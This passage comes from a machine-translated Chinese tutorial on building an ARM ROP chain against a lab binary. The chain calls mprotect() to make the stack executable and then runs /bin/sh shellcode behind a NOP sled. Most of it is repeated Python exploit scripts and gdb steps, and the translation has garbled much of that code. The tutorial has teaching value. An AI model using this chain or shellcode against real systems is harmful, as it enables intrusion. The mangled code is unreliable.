class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在是时候修改我们的漏洞脚本了。</p><p id="59a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在你会考虑在哪里插入这些新的小工具，你可以在最后一条指令之前的任何地方添加这些小工具，因为这不会影响我们的执行流程，因为它们把对pc的控制权还给我们了。我将在第二个小工具之后插入这些新小工具(pop {r0，r4，PC }；)</p><blockquote class="ks kt ku"><p id="f684" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="1773" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="29a5" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="e569" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000)#堆栈基址<br/>exp+=(" AAAA ")#垃圾<br/> exp += struct.pack(" &lt; I "，base_libc + 0x00019270) # pop {r3，PC }；#新增gadget<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(“AAAA”)<br/>exp+=下一条指令</p></blockquote><p id="42f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们添加了这个小工具，这将解决我们的分支问题，并把控制权还给我们。</p><p id="75e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们进入下一个问题。如你所知，我们利用r0将值7复制到r2。因此，这将r0的值更改为7，但我们需要r0的值作为堆栈的地址，以便我们可以成功调用mprotect()函数。</p><p id="d820" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里有一个简单的解决办法，我们只需要重新排列这些小工具，我会告诉你我的意思。让我们再次修改漏洞</p><blockquote class="ks kt ku"><p id="bf89" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="2359" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="356e" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="aa52" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；)<br/>exp+=(“AAAA”)# junk<br/>exp+= struct . pack("&lt;I "，base_libc + 0x00019270) # pop {r3，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000)#堆栈基址<br/>exp+=(" AAAA ")#垃圾<br/> exp += struct.pack(下一个)</p></blockquote><p id="e21e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">慢慢来，分析我做的改变。</p><p id="ffcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我只是将利用r0寄存器将值7复制到r2的小工具作为第一条指令，并将pop指令重新安排到最后。</p><p id="7b1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们检查一下这个漏洞是否有效。在此之前，在下一条指令中放置一个空值，这是我们接下来要放置mprotect()地址的地方，同时将堆栈地址更改为一个目前不包含任何空字节的地址(0x bedfd 000-&gt; 0x bedfd 080)。</p><blockquote class="ks kt ku"><p id="6fce" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="dad9" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="76fd" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="249c" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；)<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc + 0x00019270) # pop {r3，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 080)#堆栈基址<br/>exp+=(" AAAA ")#垃圾<br/> exp += ("BBBB") #mprotect()地址</p><p id="6354" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">打印(出口)</p></blockquote><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="mz kr l"/></div></figure><p id="1689" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将二进制文件加载到gdb中，使用“b main”在main中放置一个断点，同时确保alsr关闭。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi na"><img src="../Images/e397d76d547663456198d04aff3555e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wat8RevGNkxqdnfOA0fXVA.png"/></div></div></figure><p id="c16b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在使用我们的python脚本作为输入来运行程序</p><blockquote class="ks kt ku"><p id="e7a5" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">gef&gt; r $(python mprotect2.py)</p></blockquote><p id="12bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击bp后，进行反汇编，并在最后一个pop {r7，pc}处放置一个断点。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi nb"><img src="../Images/053c040a298d5c98b6921a92ba60524b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j2QgVp6RzD_TkU4gy2wPeQ.png"/></div></div></figure><p id="8c08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在按c键继续程序。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi nc"><img src="../Images/1cc7de8cec08d01ed997ce2e1c2a50f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ukIsltjhDOuN8_Y1uTfTHw.png"/></div></div></figure><p id="3023" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们撞上了bp。这个pop会将执行重定向到我们的第一个rop小工具。</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="nd kr l"/></div></figure><p id="8228" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个一个地步进每个小工具的视频。</p><p id="13fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，你可以看到所有的参数都被正确地放置在寄存器中(除了r0 ),并且pc已经被“BBBB”覆盖</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi ne"><img src="../Images/650b0a34ad5bf46a0875c88c530e6550.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Jn0f599wmMybzmsHOOgFnA.png"/></div></div></figure><p id="c9bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，让我们通过修复空字节并将mprotect()的地址</p><p id="82bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用上一篇文章中的小工具来修复空字节。</p><blockquote class="ks kt ku"><p id="a3c1" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">0x000fe910:加r0，r0，# 0x80pop {r3，PC }；</p></blockquote><p id="5612" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个小工具会把0x80加到r0上，然后把控制权还回去。所以这里我们需要做的是，我们要放一个值“<strong class="jp ir"><em class="kv">0x bedfd 000–0x 80</em></strong>”。我们的小工具将添加0x80，并将其恢复为“0xbefdf000”，这是堆栈的实际地址。让我们把这个小工具加入到我们的利用中</p><blockquote class="ks kt ku"><p id="af7f" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="59c5" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="55b2" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="3453" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；)<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc + 0x00019270) # pop {r3，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000–0x 80)#堆栈基址<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x000fe910) #add r0，r0，# 0x80pop {r3，PC }；<br/>exp+=(“AAAA”)# junk<br/>exp+=(“BBBB”)# mprotect()地址</p><p id="9897" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">打印(出口)</p></blockquote><p id="7ffa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们找到mprotect()的地址。让我们加载二进制文件，在main中放置一个bp并运行它</p><p id="241d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们加载二进制文件，在main中放置一个bp，然后运行它。点击断点后，使用“<em class="kv">disass”</em>命令在mprotect处进行反汇编</p><blockquote class="ks kt ku"><p id="3ea9" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">gef &gt;拆卸保护</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi nf"><img src="../Images/b3842a6f10f4953d58e1fae4825b9b42.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YJlnf2_oNfp6aicjHbk7ig.png"/></div></div></figure><p id="5583" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">复制指令的地址(push {r7})并粘贴到我们的漏洞利用脚本中</p><blockquote class="ks kt ku"><p id="ffc8" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="dee5" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="ccad" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="e6db" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；)<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc + 0x00019270) # pop {r3，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000–0x 80)#堆栈基址<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x000fe910) #add r0，r0，# 0x80pop {r3，PC }；<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，0 XB 6 f 41 e 90)# mprotect()address<br/>exp+= " BBBB " # junk</p><p id="4b6d" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">打印(出口)</p></blockquote><p id="21ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果攻击运行正确，mprotect将被调用，结果，它将使堆栈可执行。调用mprotect()后，执行将返回，所以让我们添加一个垃圾值(“BBBB”)来看看它是否工作</p><p id="3a15" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们在gdb内部运行它</p><p id="b1e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">程序在地址0x00000000处崩溃。嗯，这很奇怪，我们一会儿会研究这个问题。在此之前，让我们用<em class="kv"> vmmap </em>命令检查堆栈</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi ng"><img src="../Images/3adf075d258753d0224e3b389c8f7f97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*guvOrje_iso4wcXjzAMd1g.png"/></div></div></figure><p id="18d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看看堆栈权限我们实现了可执行权限！！！！！</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="nh kr l"/></div></figure><p id="8d59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以轻松地运行我们的shell代码并获得一个shell。在此之前，让我们解决以下问题</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi ni"><img src="../Images/5ee090eb087be4d073ad552ac330c484.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZGGpapTkRa_o19u5cMyx5A.png"/></div></div></figure><p id="1886" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">电脑被零覆盖。那么这些零是从哪里来的？如果你看一下r4寄存器，它包含值0x42424242 (BBBB)，这是我们放入漏洞的最后一个垃圾。</p><p id="9822" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行mprotect()后，执行将分支到<strong class="jp ir"> lr </strong>寄存器，因为它正在使用<strong class="jp ir"> blx </strong>指令(分支链接和交换)。<strong class="jp ir"> lr </strong>寄存器包含指令pop {r4，r5，r6，pc}。</p><p id="16be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">啊哈，所以这种流行是我们坠毁的原因。这个弹出操作从栈顶删除了四个元素，分别是r4、r5、r6和pc。r4之所以得到“BBBB”就是因为这个。所以为了控制pc，我们需要再输入2个垃圾字符，然后输入下一条指令的地址</p><p id="9936" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">pop {<br/>R4 = " BBBB "<br/>r5 = " BBBB "<br/>R6 = " BBBB "<br/>PC =下一条指令<br/> }</p><p id="630d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们修改漏洞</p><blockquote class="ks kt ku"><p id="f7f4" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="c3e2" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="3de0" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="a18b" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；)<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc + 0x00019270) # pop {r3，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000–0x 80)#堆栈基址<br/>exp+=(" AAAA ")#垃圾<br/> exp += struct.pack(" &lt; I "，base_libc+0x000fe910) #add r0，r0，# 0x80pop {r3，PC }；<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，0x b 6 f 41 e 90)# mprotect()address<br/>exp+= " BBBB " # junk<br/>exp+= " BBBB " # junk<br/>exp+= " BBBB " # junk<br/>exp+= " DDDD " # PC</p><p id="e503" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">打印(出口)</p></blockquote><p id="bd69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们再次使用gdb运行这个漏洞</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi nj"><img src="../Images/6dd1e9a18797fd6e02344f317863248b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lF442nK9sqeP7IxsMPPM4w.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">普通</figcaption></figure><p id="0ab2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不错，pc被“DDDD”覆盖。现在一切都差不多完成了，所以让我们添加外壳代码并获得一个外壳。</p><h1 id="c42d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最后的利用</h1><p id="7b7a" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">让我们添加外壳代码。我将使用下面的外壳代码</p><blockquote class="ks kt ku"><p id="a58d" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">shell code = " \ x01 \ x30 \ x8f \ xe2 \ x13 \ xff \ x2f \ xe1 \ x02 \ xa0 \ x49 \ x40 \ x52 \ x40 \ xc2 \ x71 \ x0b \ x27 \ x01 \ xdf \ x2f \ x62 \ x69 \ x6e \ x2f \ x73 \ x68 \ x78 "</p></blockquote><p id="b1f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还会添加一些nop幻灯片来防止我们的漏洞，同时让我们找一个合适的地方来放置外壳代码。为此，我将在漏洞中输入一些垃圾字符</p><blockquote class="ks kt ku"><p id="c8e9" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="aee8" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">shellcode = " \ x01 \ x30 \ x8f \ xe2 \ x13 \ xff \ x2f \ xe1 \ x02 \ xa0 \ x49 \ x40 \ x52 \ x40 \ xc2 \ x71 \ x0b \ x27 \ x01 \ xdf \ x2f \ x62 \ x69 \ x6e \ x2f \ x73 \ x68 \ x78 "<br/>nops = " \ xe1 \ xa0 \ X10 \ x01 " * 10</p><p id="9d5e" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="8132" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="67ec" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；)<br/>exp+=(“AAAA”)# junk<br/>exp+= struct . pack("&lt;I "，base_libc + 0x00019270) # pop {r3，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000–0x 80)#堆栈基址<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x000fe910) #add r0，r0，# 0x80pop {r3，PC }；<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，0x b 6 f 41 e 90)# mprotect()address<br/>exp+= " BBBB " # junk<br/>exp+= " BBBB " # junk<br/>exp+= " BBBB " # junk<br/>exp+= " A " * 24<br/>exp+= nops<br/>exp+= shellcode<br/>exp+= " AAAA "</p></blockquote><p id="e080" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们使用gdb运行它，并检查堆栈以找到合适的位置。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi no"><img src="../Images/5111d4ccce83e8a89dcefb774b7a84e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jGoWDWKUnCdnkMj68Dvygg.png"/></div></div></figure><p id="3e36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">地点<strong class="jp ir"> 0xbefff1f4 </strong>似乎是一个合适的地方，因为它包含了我们的nop幻灯片。让我们把这作为我们利用的开始。所以我们可以在mprotect()调用后将这个地址作为pc的下一个地址。这将把执行重定向到"<strong class="jp ir"> 0xbefff1f4 </strong>"并执行外壳代码。让我最后一次修改我的漏洞。</p><blockquote class="ks kt ku"><p id="c36f" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="fbef" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">shellcode = " \ x01 \ x30 \ x8f \ xe2 \ x13 \ xff \ x2f \ xe1 \ x02 \ xa0 \ x49 \ x40 \ x52 \ x40 \ xc2 \ x71 \ x0b \ x27 \ x01 \ xdf \ x2f \ x62 \ x69 \ x6e \ x2f \ x73 \ x68 \ x78 "<br/>nops = " \ xe1 \ xa0 \ X10 \ x01 " * 10</p><p id="8955" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="ac4b" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="059e" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；)<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc + 0x00019270) # pop {r3，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0002 df 80)# pop { r7，pc}的地址；<br/> exp += struct.pack(" &lt; I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000–0x 80)#堆栈基址<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x000fe910) #add r0，r0，# 0x80pop {r3，PC }；<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，0x b 6 f 41 e 90)# mprotect()address<br/>exp+= " BBBB " # junk<br/>exp+= " BBBB " # junk<br/>exp+= " BBBB " # junk<br/>exp+= struct . pack("&lt;I "，0x befff 1 f 4)#漏洞利用开始<br/> exp += "A" * 24 【T45</p><p 